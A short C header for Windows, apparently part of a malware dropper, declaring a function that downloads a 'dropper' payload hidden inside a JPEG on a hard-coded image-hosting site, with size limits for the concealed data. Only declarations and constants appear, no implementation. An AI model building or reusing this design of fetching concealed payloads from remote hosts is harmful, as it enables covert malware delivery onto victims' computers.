#ifndef DOWNLOAD_H
#define DOWNLOAD_H

#include <Windows.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#define URL_MAX_SIZE 128

// Default website
#define WEBSITE "nsa20.casimages.com"
#define WEBISTE_RESSOURCE_PATH "/img/2014/01/13/140113041605960574.jpg"

#define WEBSITE_MAX_SIZE 48
#define PATH_MAX_SIZE 96


#define HIDDEN_MAX_SIZE 15000000


BOOL getHiddenFromInternet(char*dropper, long* dropperLen, char* website, char* path);


#endif